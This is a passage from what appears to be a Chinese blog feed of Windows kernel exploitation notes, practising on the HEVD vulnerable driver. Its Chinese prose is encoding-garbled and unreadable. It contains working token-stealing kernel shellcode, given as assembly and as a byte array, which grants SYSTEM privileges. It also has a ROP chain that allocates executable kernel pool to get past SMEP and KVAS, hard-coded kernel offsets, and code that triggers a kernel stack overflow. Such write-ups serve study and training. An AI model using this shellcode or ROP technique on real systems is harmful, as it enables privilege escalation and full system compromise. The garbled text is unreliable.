0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff&#125;; å†™å…¥ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡æ¡£ï¼Œç”¨idaé€†å‘ å‘ç°åŸç†ä¸€è‡´ï¼Œæœ€åå¯¹æ ˆçš„æ¢å¤ä¸åŒ å·²çŸ¥gs:[0x188]æŒ‡å‘ä¸€ä¸ª_KTHREADç»“æ„ä½“ æ ¹æ®windbgçš„è°ƒè¯•ç»“æœçŸ¥é“ 12345678910mov cx, [rax+0x1e4] ;+0x1e4 KernelApcDisable : 0n-1inc cx ;mov [rax+0x1e4], cx ;æ›´æ–°KernelApcDisableä¸º0mov rdx, [rax+0x90] ;+0x090 [TrapFrame]: 0xfffff88e`1d2edb00 ;_KTRAP_FRAME ;---ä¸‹é¢ä¸º_KTRAP_FRAMEmov rcx, [rdx+0x168] ;[+0x168] Ripmov r11, [rdx+0x178] ;[+0x178] EFlagsmov rsp, [rdx+0x180] ;[+0x180] Rspmov rbp, [rdx+0x158] ;[+0x158] Rbp å¯èƒ½è¿˜æ˜¯æœ‰ç‚¹ğŸ˜µï¼Œåæ±‡ç¼–ä¸€ä¸‹TrapFrameçš„RIP ç›¸å½“äºé€šè¿‡TrapFrameï¼Œæ›¿æ¢äº†expä¸­çš„DeviceIoControlï¼ˆæ¨¡ä»¿æ­£å¸¸æ‰§è¡Œï¼‰ï¼Œå¹¶è®©ä»–æ­£å¸¸è¿”å› æ¥ç€é‡å®šä½GSå¯„å­˜å™¨ï¼Œä½¿ç”¨sysretè¿”å›ï¼Œä¸ºäº†å¯¹é½ï¼Œæœ‰çš„æ±‡ç¼–æ˜¯è¿™æ ·çš„å†™çš„ 1o64 sysret ; nasm shit D. å¼€å¯Tokenæ‰€æœ‰æƒé™ [ä¼˜åŒ–shellcode] å³ä½¿æˆ‘ä»¬å·²ç»æˆåŠŸç”Ÿæˆäº†ä»¤ç‰Œï¼Œä½†æ˜¯åŠŸèƒ½ä¾æ—§æ˜¯ä¸å…¨çš„ è¢«ç¦ç”¨çš„åŠŸèƒ½ä¾æ—§æœ‰å¾ˆå¤š I. å¼€å¯å½“å‰æƒé™ä¸ºå¯ç”¨ é‡æ–°æ‰“å¼€ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„cmd.exe ç”¨Aéƒ¨åˆ†çš„æ–¹æ³•æ‰¾åˆ°è¯¥è¿›ç¨‹ æŸ¥çœ‹tokenæ ¼å¼ï¼Œå¯¹ç…§ä¸€ä¸‹SIDã€‚ï¼ˆæ³¨æ„ä½ä½è¦ä¸º0ï¼‰ 1!token &lt;Tokenæ•°å€¼ï¼Œä½†æ˜¯ä¸ªä½æ•°ä¸º0&gt; 1dt !_sep_token_privileges 0xffffb106`ecc96060+0x40 å°†Enabledå€¼è®¾ç½®ä¸ºPresentå€¼ 1eq 0xffffb106`ecc96060+0x40+8 0x00000006`02880000 æŸ¥çœ‹æƒé™ II. è·å¾—æ‰€æœ‰æƒé™å¹¶å¯ç”¨ ç”¨Aéƒ¨åˆ†çš„æ–¹æ³•å¾—åˆ°Systemçš„Token å†å¾—åˆ°SystemTokençš„Presentå€¼ è®¾ç½®å½“å‰Tokençš„Presentå’ŒEnabledä¸ºè¯¥å€¼ æŸ¥çœ‹æƒé™ III.é‡æ–°ç¼–å†™shellcode 1234567891011121314151617181920212223242526272829303132333435363738[Bits 64]_start: xor rax, rax mov rax, gs:[rax + 0x188] mov rax, [rax + 0xb8] ;rax = å½“å‰EPROCESS mov r9, rax ;r9 = å½“å‰EPROCESS mov rax, [rax + 0x448] ;rax = å½“å‰EPROCESS.List mov rax, [rax] ;rax = å½“å‰EPROCESS.List-&gt;flink__loop: mov rdx, [rax - 0x8] ;rdx = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„ upid mov r8, rax ;r8 = å½“å‰EPROCESS.List-&gt;flink mov rax, [rax] ;rax = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„.List cmp rdx, 0x4 jnz __loop ;rdx = 4 ;r8 = System EPROCESS mov rdx, [r8+0x70] ;rdx = system token and rdx, -0x8 ;æ¶ˆé™¤ä½4ä½ mov rcx, [r9+0x4b8] ;å½“å‰EPROCESSçš„token and rcx, 0x7 ; add rdx, rcx ;rdx = ç³»ç»Ÿtokené«˜ä½+å½“å‰tokenä½4ä½ mov [r9+0x4b8], rdx ;å°†åˆæˆçš„tokenå¤åˆ¶ç»™å½“å‰ ;Enable ALL mov rdx, [r8 + 0x70] ;rdx = system token and rdx, 0xFFFFFFFFFFFFFFF0 ;system token: æ¶ˆé™¤ä½8ä½ï¼Œä¾¿äºè§£æToken mov rbx, [rdx + 0x40] ;rbx = System tokençš„Present mov rcx, [r9 + 0x4b8] ;rcx = æ–°çš„EPROCESSçš„token and rcx, 0xFFFFFFFFFFFFFFF0 ;new current token: æ¶ˆé™¤ä½8ä½ï¼Œä¾¿äºè§£æToken mov [rcx + 0x40], rbx mov [rcx + 0x48], rbx xor rax, rax add rsp, 0x10 retn KVAS A. ç®€ä»‹ KVASå…¨ç§°æ˜¯Kernel Virtual Address Shadowï¼Œå®ƒçš„å‡ºç°ä¸MeltDownï¼ˆCVE-2017-5754ï¼‰å’ŒTotalMeltDownï¼ˆCVE-2018-1038ï¼‰æœ‰å…³ã€‚ æˆ‘çš„æè¿°ä¸ä¸€å®šå‡†ç¡®ï¼Œå¤§è‡´ä¸Šæ¥è¯´è¿™ä¸¤ä¸ªæ¼æ´åˆ©ç”¨äº†CPUçš„ä¹±åºæ‰§è¡ŒæŠ€æœ¯ï¼Œå³CPUåœ¨æ‰§è¡Œæ—¶ä¸ä¸€å®šä¼šæŒ‰ç…§æµç¨‹æ‰§è¡Œã€‚å½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ªä¸èƒ½è¢«ç”¨æˆ·æ¨¡å¼è®¿é—®çš„å†…å­˜é¡µæ—¶ï¼ŒCPUä¼šæ‰§è¡Œè¯¥è¯­å¥ç„¶åå°†å…¶ç¼“å­˜åˆ°å†…å­˜ä¸­ï¼Œç­‰åˆ°å‘ç°ä¸èƒ½è®¿é—®åè¿”å›é”™è¯¯ï¼Œä½†æ˜¯è¯¥æ•°æ®ä¾æ—§å­˜åœ¨äºç¼“å­˜å½“ä¸­ã€‚åˆ©ç”¨è¿™ç§æ€è·¯å°±å¯ä»¥å®Œå…¨è¯»å–å†…æ ¸ä¸­çš„æ•°æ®ï¼Œå®ç°æƒé™æå‡ç­‰ã€‚ å¾®è½¯ä¸ºäº†ç¼“è§£è¯¥æ¼æ´ï¼Œä»ç”¨æˆ·é¡µè¡¨ä¸­éš”ç¦»å‡ºå†…æ ¸é¡µè¡¨ï¼Œè®©ç”¨æˆ·æ€è®¿é—®åˆ°çš„å†…æ ¸é¡µè¡¨ä¹Ÿæ˜¯ç»è¿‡æ˜ å°„çš„ï¼Œå¹¶ä¸”ä¼šå°†ç”¨æˆ·é¡µè¡¨è‡ªåŠ¨æ ‡è®°ä¸ºNXï¼Œè®©æˆ‘ä»¬çš„shellcodeæ— æ³•æ‰§è¡Œ B. Bypass è™½ç„¶ç”¨æˆ·é¡µè¡¨ä¸ºä¸å¯æ‰§è¡Œï¼Œä½†æ˜¯å†…æ ¸é¡µè¡¨ä»ç„¶å¯æ‰§è¡Œï¼Œåªä¸è¿‡ä¼šå»¶é•¿æˆ‘ä»¬ROPé“¾çš„é•¿åº¦ éœ€è¦ç”¨åˆ°çš„å‡½æ•°æ˜¯ï¼šExAllocatePoolWithTagå’ŒRtlCopyMemory ExAllocatePoolWithTagï¼šç”¨äºåœ¨å†…æ ¸ä¸­å¼€è¾Ÿä¸€å—åœ°å€ RtlCopyMemoryï¼šå¤åˆ¶å†…å­˜åˆ°å†…æ ¸å¼€è¾Ÿçš„å†…å­˜æ±  1234LPVOID space = ExAllocatePoolWithTag(0, 0x100, 0xDEAD);//NonPagedPoolExecute = 0//ç©ºé—´å¤§å°ï¼š0x100RtlCopyMemory(space, shellcode_addr, 0x100); MSDNä¸­è¯´æ˜è¯¥ä¸¤ä¸ªå‡½æ•°åœ¨å†…æ ¸ä¸­å‡ä½äº NtosKrnl.exeé‡Œï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬ä¸€ç« çš„å†…å®¹å¯»æ‰¾åˆ°è¯¥åœ°å€ï¼Œå¯ä»¥ä½¿ç”¨CFF ExploreræŸ¥çœ‹å¯¼å‡ºè¡¨æ‰¾åˆ°å‡½æ•° éœ€è¦è¯´æ˜çš„ä¸€ç‚¹æ˜¯ExAllocatePoolWithTagæœ‰ä¸€ä¸ªå¾ˆæ¶å¿ƒçš„åœ°æ–¹å°±æ˜¯ è¿™ä¸‰ä¸ªmovä¼šæ‰“ä¹±æˆ‘ä»¬ç²¾å¿ƒè®¾è®¡çš„ROPé“¾ï¼Œè€Œä¸”åé¢æ ¹æœ¬æ²¡æœ‰ä½¿ç”¨åˆ°ä»–ï¼Œæ‰€ä»¥è¦ç›´æ¥è¿›å…¥push rdiçš„ä½ç½® RtlCopyMemoryå…¶å®æ˜¯ä¸€ä¸ªå® 123unsigned long long base = ulGetKernelBase((PCHAR)&quot;ntoskrnl.exe&quot;);unsigned long long ulExAllocatePoolWithTag = base + 0x9B203F;unsigned long long ulRtlCopyMemory = base + 0x40BEC0; æ ¹æ®å¾®è½¯çš„å‡½æ•°è°ƒç”¨è§„åˆ™ï¼Œä¼ å‚é¡ºåºæ˜¯rcxï¼Œrdxï¼Œr8ï¼Œè¿”å›åœ°å‚æ•°åœ¨raxä¸­ é‚£ä¹ˆä¸€ä¸ªç†æƒ³çš„ROPå¸ƒå±€ 1234567891011121314pop rcx rdx r8 ret00x1000xDEADExAllocatePoolWithTag---------------------------pop rcx rdx r8 ret0 ;æš‚æ—¶shellcode_addr0x100;mov rcx, rax ret ;æ­¤æ—¶rcx = ExAllocatePoolWithTagè¿”å›åœ°å†…å­˜åœ°å€RtlCopyMemory---------------------------jmp rax å°±è¿™äº›gadgetä¸­çš„popä¼šæ¶ˆé™¤rsp+0x28çš„é©±åŠ¨çš„Handleå‡½æ•°è¿”å›åœ°å€ï¼Œæ‰€ä»¥é¦–å…ˆæ˜¯æŠ¬æ ˆï¼Œå¦‚sub rsp, 0x100ï¼Œåœ¨jmp raxä¹‹å‰å¤šæ¬¡è°ƒç”¨retæ¥æŠ¬å‡rspçš„å€¼ï¼Œæœ€ç»ˆå›åˆ°shellcodeè°ƒæ•´ä¸ºé€‚ç”¨çš„rspå€¼ã€‚ å®é™…æƒ…å†µä¸­ä¹Ÿä¸ä¼šæœ‰æ°å¥½çš„gadgetç”¨ å®é™…ä¸Šèƒ½ç”¨çš„mov rcx, raxå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç° 1230x00000001408fa783 : push rax ; push rbx ; ret0x00000001408fa77b : push rax ; push rdi ; ret0x000000014020262C : pop rdi ; ret è¿™æ ·å°±èƒ½è®©rcx=raxäº†ï¼Œå¸ƒå±€åæ ˆçš„æƒ…å†µ 1234ulExAllocatePoolWithTagpop_rdipop_rcxpush_rax_rdi pop rdiï¼šRDI =pop rcxåœ°å€ï¼Œå‡ºæ ˆä¸€ä¸ªï¼ŒrspæŒ‡å‘push_rax_rdiï¼Œç„¶åretè·³è½¬åˆ°è¯¥åœ°å€ push raxï¼šå°†ç”³è¯·çš„å†…æ ¸å†…å­˜åœ°å€æ”¾åˆ°äº†æ ˆä¸Šï¼ŒrspæŒ‡å‘å€¼å°±ä¸ºè¯¥å†…å­˜çš„åœ°å€ push rdi; retï¼šç­‰æ•ˆäºjmp rdiï¼Œäºæ˜¯retåˆ°äº†pop rcx pop rcxï¼šæ­¤æ—¶çš„æ ˆé¡¶ä¸º 2 ä¸­å…¥æ ˆçš„rax æˆåŠŸè®©RCX=RAX è¿™é‡Œæš‚æ—¶è®¾è®¡payload 123456789101112131415161718192021//typedef unsigned long long funcaddr; *(funcaddr*)(stackspace + 0x818) = (funcaddr)pop_rcx; *(funcaddr*)(stackspace + 0x818 + 8) = (funcaddr)0; *(funcaddr*)(stackspace + 0x818 + 0x10) = (funcaddr)pop_rdx; *(funcaddr*)(stackspace + 0x818 + 0x18) = (funcaddr)0x100; *(funcaddr*)(stackspace + 0x818 + 0x20) = (funcaddr)pop_r8; *(funcaddr*)(stackspace + 0x818 + 0x28) = (funcaddr)0xDEAD; *(funcaddr*)(stackspace + 0x818 + 0x30) = (funcaddr)ulExAllocatePoolWithTag; *(funcaddr*)(stackspace + 0x818 + 0x38) = (funcaddr)pop_rdi; //rsp = 0 *(funcaddr*)(stackspace + 0x818 + 0x40) = (funcaddr)pop_rcx; //rdi = rcx --- been force to zero *(funcaddr*)(stackspace + 0x818 + 0x48) = (funcaddr)push_rax_rdi;//ret rdi: pop_rcx value changed *(funcaddr*)(stackspace + 0x818 + 0x50) = (funcaddr)pop_rdx; //æ­¤å¤„è¢«ä½ä½è¢«æ¸…é›¶ *(funcaddr*)(stackspace + 0x818 + 0x58) = (funcaddr)shellcode_addr; *(funcaddr*)(stackspace + 0x818 + 0x70) = (funcaddr)pop_r8; *(funcaddr*)(stackspace + 0x818 + 0x78) = (funcaddr)sizeof(cmd); *(funcaddr*)(stackspace + 0x818 + 0x80) = (funcaddr)ulRtlCopyMemory; *(funcaddr*)(stackspace + 0x818 + 0x88) = (funcaddr)jmp_rax; ä½†æ˜¯è¿›è¡ŒExAllocatePoolWithTag æ‰“æ–­äº†ROPé“¾ï¼Œè®©rsp+68çš„ä½ç½®çš„ä½32ä½æ¸…é›¶äº†ï¼Œè¿™è®©æˆ‘ä»¬éœ€è¦è°ƒæ•´è¿™æ®µropé“¾ 1234567*(funcaddr*)(stackspace + 0x818 + 0x50) = (funcaddr)pop_rdx; //æ­¤å¤„è¢«ä½ä½è¢«æ¸…é›¶*(funcaddr*)(stackspace + 0x818 + 0x58) = (funcaddr)shellcode_addr; *(funcaddr*)(stackspace + 0x818 + 0x60) = (funcaddr)pop_rdx; //æ¢å¤rdx*(funcaddr*)(stackspace + 0x818 + 0x68) = (funcaddr)shellcode_addr; *(funcaddr*)(stackspace + 0x818 + 0x70) = (funcaddr)pop_r8;*(funcaddr*)(stackspace + 0x818 + 0x78) = (funcaddr)sizeof(cmd); åœ¨è®¾ç½®CR4.SMEPçš„æƒ…å†µä¸‹ï¼Œä¾é å†…æ ¸åˆ†é…çš„å†…å­˜ï¼ŒæˆåŠŸè¿è¡Œäº†shellcodeï¼ŒROPé“¾è¿›è¡Œäº†å¤šæ¬¡è°ƒç”¨ï¼Œè®©æœ€åshellcodeä¸­çš„rspå€¼ä¸å¥½ä¼°è®¡ï¼Œå¹¶ä¸”æ ˆçš„æƒ…å†µå¯èƒ½éšç€å‡½æ•°çš„è°ƒç”¨å°†åŸæœ‰çš„å€¼æŠ¹å»ï¼Œè¿™é‡Œå…ˆæŠŠshellcodeæ¢æˆä»TrapFrameè¿”å›çš„ C. ä¼˜åŒ–shellcode æ‰€ä»¥è¿™æ®µshellcodeå‚è€ƒshellcodeç¼–å†™çš„Cã€Déƒ¨åˆ†ï¼ŒåŠ ä¸Šäº†æ‰€æœ‰åŠŸèƒ½Enabledçš„shellcodeç‰‡æ®µ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[Bits 64]_start: xor rax, rax mov rax, gs:[rax + 0x188] mov rax, [rax + 0xb8] ;rax = å½“å‰EPROCESS mov r9, rax ;r9 = å½“å‰EPROCESS mov rax, [rax + 0x448] ;rax = å½“å‰EPROCESS.List mov rax, [rax] ;rax = å½“å‰EPROCESS.List-&gt;flink__loop: mov rdx, [rax - 0x8] ;rdx = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„ upid mov r8, rax ;r8 = å½“å‰EPROCESS.List-&gt;flink mov rax, [rax] ;rax = ä¸Šä¸€ä¸ªè¿›ç¨‹çš„.List cmp rdx, 0x4 jnz __loop ;rdx = 4 ;r8 = System EPROCESS mov rdx, [r8+0x70] ;rdx = system token and rdx, -0x8 ;æ¶ˆé™¤ä½4ä½ mov rcx, [r9+0x4b8] ;å½“å‰EPROCESSçš„token and rcx, 0x7 ; add rdx, rcx ;rdx = ç³»ç»Ÿtokené«˜ä½+å½“å‰tokenä½4ä½ mov [r9+0x4b8], rdx ;å°†åˆæˆçš„tokenå¤åˆ¶ç»™å½“å‰ ;Enable ALL mov rdx, [r8 + 0x70] ;rdx = system token and rdx, 0xFFFFFFFFFFFFFFF0 ;system token: æ¶ˆé™¤ä½8ä½ï¼Œä¾¿äºè§£æToken mov rbx, [rdx + 0x40] ;rbx = System tokençš„Present mov rcx, [r9 + 0x4b8] ;rcx = æ–°çš„EPROCESSçš„token and rcx, 0xFFFFFFFFFFFFFFF0 ;new current token: æ¶ˆé™¤ä½8ä½ï¼Œä¾¿äºè§£æToken mov [rcx + 0x40], rbx mov [rcx + 0x48], rbx mov rax, gs:188h mov cx, [rax+1E4h] inc cx mov [rax+1E4h], cx mov rdx, [rax+90h] mov rcx, [rdx+168h] mov r11, [rdx+178h] mov rsp, [rdx+180h] mov rbp, [rdx+158h] xor eax, eax swapgs o64 sysret å¾—åˆ°shellcode 1234567891011121314151617unsigned char cmd[176] = &#123; 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC1, 0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x50, 0xF8, 0x49, 0x89, 0xC0, 0x48, 0x8B, 0x00, 0x48, 0x83, 0xFA, 0x04, 0x75, 0xF0, 0x49, 0x8B, 0x50, 0x70, 0x48, 0x83, 0xE2, 0xF8, 0x49, 0x8B, 0x89, 0xB8, 0x04, 0x00, 0x00, 0x48, 0x83, 0xE1, 0x07, 0x48, 0x01, 0xCA, 0x49, 0x89, 0x91, 0xB8, 0x04, 0x00, 0x00, 0x49, 0x8B, 0x50, 0x70, 0x48, 0x83, 0xE2, 0xF0, 0x48, 0x8B, 0x5A, 0x40, 0x49, 0x8B, 0x89, 0xB8, 0x04, 0x00, 0x00, 0x48, 0x83, 0xE1, 0xF0, 0x48, 0x89, 0x59, 0x40, 0x48, 0x89, 0x59, 0x48, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8B, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x66, 0xFF, 0xC1, 0x66, 0x89, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8A, 0x68, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x9A, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xA2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xAA, 0x58, 0x01, 0x00, 0x00, 0x31, 0xC0, 0x0F, 0x01, 0xF8, 0x48, 0x0F, 0x07&#125;; ç¼ºç‚¹å°±æ˜¯ç¨‹åºæ— æ³•exité€€å‡ºï¼Œä¸è¿‡å¯ä»¥åœ¨shellcodeä¸­è®¾ç½®Tokenè¿ç§»ç­‰ä¸€äº›å…¶ä»–æ“ä½œï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº† å‚è€ƒ https://wumb0.in/finding-the-base-of-the-windows-kernel.html https://github.com/xct/windows-kernel-exploits https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/ https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/ https://mdanilor.github.io/posts/hevd-2/","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"ã€Win Pwnã€‘ä»é›¶æ¢ç´¢ç°ä»£windowså†…æ ¸æ ˆæº¢å‡º-ä»¥HEVDç»ƒä¹ ä¸ºä¾‹ï¼ˆä¸­ï¼‰","slug":"win-hevd-exp-stackoverflow-II","date":"2024-01-25T07:07:30.000Z","updated":"2024-01-30T10:35:17.454Z","comments":true,"path":"2024/01/25/win-hevd-exp-stackoverflow-II/","link":"","permalink":"https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/","excerpt":"åœ¨ä¸Šä¸€ç¯‡ä¸­äº†è§£äº†ä¸å†…æ ¸çš„äº¤äº’æ¨¡å¼ï¼Œè¿™é‡Œå°±å¯ä»¥å¼€å§‹åšHEVDäº† æ–‡ç« å·²åœ¨å…ˆçŸ¥ç¤¾åŒºæŠ•ç¨¿ï¼šhttps://xz.aliyun.com/t/13364","text":"åœ¨ä¸Šä¸€ç¯‡ä¸­äº†è§£äº†ä¸å†…æ ¸çš„äº¤äº’æ¨¡å¼ï¼Œè¿™é‡Œå°±å¯ä»¥å¼€å§‹åšHEVDäº† æ–‡ç« å·²åœ¨å…ˆçŸ¥ç¤¾åŒºæŠ•ç¨¿ï¼šhttps://xz.aliyun.com/t/13364 ç¼–å†™äº¤äº’æ¨¡å— A. è®¡ç®—IO_CTLå€¼ å…¶å®ä¸ç”¨è¿™æ­¥ï¼Œä½†æ˜¯å¯ä»¥å½“ä½œæ›´å¤šçš„äº†è§£ åœ¨ä¹‹å‰çš„äº¤äº’ä¸­æœ‰è¿™ä¹ˆä¸€æ¡å®šä¹‰åŠŸèƒ½å· 1#define IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS) ä½†æ˜¯â€¦HEVDé€†å‘ä¼šå‘ç°æ˜¯è¿™æ ·çš„ å‘ç°CTL_CODEä¹Ÿæ˜¯ä¸ªå®å®šä¹‰ 123#define CTL_CODE( DeviceType, Function, Method, Access ) ( \\ ((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method) \\) å…¶ä¸­ï¼Œè¿™é‡Œ DeviceType -&gt; FILE_DEVICE_UNKNOWN = 0x22 Function -&gt; = 0x9888 Method -&gt; METHOD_BUFFERED=0 Access -&gt; FILE_ANY_ACCESS=0 è¡¨è¾¾å¼å°±ä¸º 1234 (0x22 &lt;&lt; 16) | (0 &lt;&lt; 14) | ( 0x9888 &lt;&lt; 2) | 0= 0x220000 | 0 | 0x9888 &lt;&lt; 2 | 0= 0x220000 | 0x9888 &lt;&lt; 2= 0x226220 å¾ˆå®¹æ˜“å¾—åˆ°é€†å‘ï¼Œè¿™é‡Œä»¥0x226220ä¸ºä¾‹å­ 120x205B = 0x22205B ^ 0x2200000x816 = 0x205B&gt;&gt;2 é‚£ä¹ˆå¯¹åº”çš„å‡½æ•° 123unsigned int io2num(unsigned int ioctl_num) &#123; return ((ioctl_num ^ 0x220000) &gt;&gt; 2) &amp; 0xfff;&#125; åé¢ä¹‹æ‰€ä»¥è¦&amp;ä¸€ä¸‹æ˜¯å› ä¸ºæ•°æ®çš„å¤§å°å°±åªæœ‰é‚£ä¹ˆå¤§ï¼Œæ‰€ä»¥IIæ–‡ç« çš„æè¿°ç¬¦0x9888å®é™…æœ‰æ•ˆçš„åªæœ‰0x888 B. åŠŸèƒ½é€‰æ‹© è¿™é‡Œå°±ä»¥æœ€ç®€å•çš„å†…æ ¸æ ˆæº¢å‡ºä¸¾ä¾‹å­ æ¯å¼€å§‹ä¸€ä¸ªæ¼æ´åˆ©ç”¨å°±ç¼–å†™ä¸€ä¸ªèœå•ï¼Œç„¶åé€‰æ‹©è§£æé€†å‘å‡ºæ¥çš„åŠŸèƒ½æè¿°ç¬¦ï¼Œè¿è¡Œå¯¹åº”å‡½æ•°ï¼Œæ²¡å•¥å¥½è®²çš„ 123456789101112131415161718192021222324252627282930313233void menu() &#123; cout &lt;&lt; &quot;============HEVD Hack EXP============\\n&quot;; cout &lt;&lt; &quot; 1. [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\\n&quot;; cout &lt;&lt; &quot;input io ctl&gt; &quot;;&#125;int main()&#123; HANDLE hDevice = NULL; hDevice = CreateFileW(L&quot;\\\\\\\\.\\\\My1DeviceLinker&quot;, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hDevice == INVALID_HANDLE_VALUE) &#123; cout &lt;&lt; &quot;Error Create File\\n&quot;; return 0; &#125; unsigned int io_ctl = 0; menu(); scanf_s(&quot;%x&quot;, &amp;io_ctl); printf(&quot;%x, %x&quot;, io_ctl, io2num(io_ctl)); switch (io_ctl) &#123; case 1: &#123; cout &lt;&lt; &quot;Now Excuting ...\\n&quot;; cout &lt;&lt; &quot;1. [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ****** ...\\n&quot;; // // EXP FUNCTION HERE // &#125; default: break; &#125;&#125; C. ç®€å•ä¸åŠŸèƒ½äº¤äº’ è¿™é‡Œè¦ä¼ ä¸€ä¸ªç©ºé—´å’Œå¤§å°è¿‡å»ï¼Œè¿™é‡Œç”¨çš„åˆ°æ–¹å¼å°±æ˜¯ä¸Šä¸€ç¯‡çš„IOCTLæ–¹å¼ è¿™é‡Œæˆ‘æŠŠæ‰€æœ‰çš„expå®šä¹‰åœ¨exp.c 1234567void StackOverflow(HANDLE hDevice, unsigned int ioctl) &#123; char stackspace[0x50] = &quot;aaaaa\\0&quot;; unsigned int size = 0x30; DWORD info = 0; DeviceIoControl(hDevice, ioctl, stackspace, sizeof(DWORDLONG), &amp;size, sizeof(DWORDLONG), &amp;info, NULL); std::cout &lt;&lt; &quot;IO Complete\\n&quot;;&#125; é©±åŠ¨å®šä¹‰äº†ä¸€ä¸ª2048å¤§å°çš„æ ˆç©ºé—´v5ï¼Œä½†æ˜¯å†™å…¥çš„ç©ºé—´æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œå°è¯•è§¦å‘æ¼æ´ 1234567891011121314void StackOverflow(HANDLE hDevice, unsigned int ioctl) &#123; char stackspace[0x1000] = &#123; 0 &#125;; unsigned int size = 0x1000; RtlFillMemory(stackspace, size, &#x27;A&#x27;); DWORD info = 0; DeviceIoControl(hDevice, ioctl, stackspace, size, NULL, 0, &amp;info, NULL); printf(&quot;info: %d\\n&quot;, info); std::cout &lt;&lt; &quot;IO Complete\\n&quot;;&#125; D. å¼€å§‹è°ƒè¯• ä¹‹å‰ç¬¦å·è¡¨å¥½åƒæ²¡åŠ è½½ä¸Šï¼Œåœ¨windbgä¸­ï¼ŒHEVDçš„æè¿°ç¬¦ä¸€èˆ¬åœ¨åŒçº§æ–‡ä»¶å¤¹ä¸‹ 1.sympath+ &lt;pdbæ–‡ä»¶ç‰©ç†æœºä¸Šçš„è·¯å¾„&gt; ç„¶åå† 1lm m HEVD 1x /D /f HEVD!* ä¸‹ä¸ªæ–­ç‚¹ 1bp HEVD!TriggerBufferOverflowStack è¿™é‡Œè¿è¡Œä¸‹ä¸å´©æºƒçš„ I. Windbg è°ƒè¯•å¸¸ç”¨ åœ¨ä½¿ç”¨Windbgè°ƒè¯•å†…æ ¸é©±åŠ¨ç¨‹åºæ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å†…å­˜åœ°å€ï¼š 64ä½æŸ¥çœ‹å†…å­˜ 1dq &lt;å†…å­˜åœ°å€&gt; L &lt;è¦æŸ¥çœ‹çš„é•¿åº¦ï¼Œé•¿åº¦æ˜¯64ä½ä¸ºä¸€ç»„&gt; 64ä½æŸ¥çœ‹å†…å­˜ï¼Œå•åˆ—æ˜¾ç¤ºï¼Œè¿™åœ¨æŸ¥çœ‹æ ˆçš„æƒ…å†µæ˜¯æ¯”è¾ƒå¥½ç”¨ 1dqs &lt;å†…å­˜åœ°å€&gt; L &lt;è¦æŸ¥çœ‹çš„é•¿åº¦ï¼Œé•¿åº¦æ˜¯64ä½ä¸ºä¸€ç»„&gt; åœ¨æŸå¤„æ·»åŠ æ–­ç‚¹ 1bp &lt;å†…å­˜è™šæ‹Ÿåœ°å€&gt; 12bp &lt;æ¨¡å—å&gt;!&lt;å‡½æ•°å&gt;//bp: break point å¦‚ bp HEVD!TriggerBufferOverflowStack æŸ¥çœ‹æ‰€æœ‰æ–­ç‚¹ 1bl å¿«é€Ÿåæ±‡ç¼–ï¼Œé€‚åˆæŸ¥çœ‹gadget 1u &lt;å†…å­˜åœ°å€&gt; 